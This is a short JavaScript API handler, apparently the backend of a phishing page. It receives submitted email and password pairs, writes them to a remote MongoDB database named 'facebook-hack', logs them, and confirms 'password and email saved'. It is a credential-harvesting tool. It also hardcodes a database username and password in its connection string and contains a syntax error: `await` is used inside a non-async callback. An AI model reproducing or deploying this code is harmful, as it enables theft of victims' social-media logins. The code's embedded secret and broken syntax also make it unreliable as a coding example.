import { MongoClient } from "mongodb";


const handler = async (req, res) => {

  if (req.method === "POST") {

    const { email, password } = req.body

    // conexion base de datos

    try {
      const client = new MongoClient('mongodb+srv://sebas:1234@cluster0.z513b.mongodb.net/myFirstDatabase?retryWrites=true&w=majority', {
        useUnifiedTopology: true,
        useNewUrlParser: true
      })

      if (!client.isConnected()) {
        client.connect().then(() => {
          await client.db('facebook-hack').collection('users').insertOne({ email, password })
        })
      }
    } catch (error) {
      console.log(error)
    }

    console.log(email, password)

    res.status(200).json({ message: 'password and email saved' })
  } else {

    res.status(405).json({ message: 'http message not supported' })
  }

}

export default handler


